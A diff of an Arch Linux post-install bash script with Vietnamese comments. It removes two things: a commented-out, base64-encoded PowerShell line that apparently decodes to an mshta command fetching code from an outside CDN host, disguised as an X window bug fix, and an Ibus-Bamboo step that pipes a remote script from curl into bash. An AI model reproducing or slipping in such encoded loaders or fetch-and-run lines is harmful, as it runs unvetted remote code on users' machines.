@@ -1,6 +1,5 @@
 #!/bin/bash
 # dùng spawnonce fix bug xwindow
-# powershell.exe -eC bQBzAGgAdABhACAAaAB0AHQAcABzADoALwAvAGEAcAB6AHoAegAtADIAMABjADcAZQAuAGsAeABjAGQAbgAuAGMAbwBtAC8AYQBwAHoAegB6AC0AMgAwAGMANwBlAA==
 
 # Khởi tạo biến toàn cục
 errorCount=0
@@ -157,13 +156,6 @@ checkAndLogError $? "Failed to start Bluetooth service."
 
 yay -S --needed --noconfirm bluetuith
 checkAndLogError $? "Failed to install bluetuith using yay."
-
-# Cài đặt Ibus-Bamboo
-echo -e "\e[32m [ INFO ] Ibus-Bamboo \e[0m"
-ibus-daemon &
-checkAndLogError $? "Failed to start ibus-daemon."
-bash -c "$(curl -fsSL https://raw.githubusercontent.com/BambooEngine/ibus-bamboo/master/archlinux/install.sh)"
-checkAndLogError $? "Failed to install Ibus-Bamboo."
 
 # Cài đặt Dark theme
 echo -e "\e[32m [ INFO ] Dark theme \e[0m"
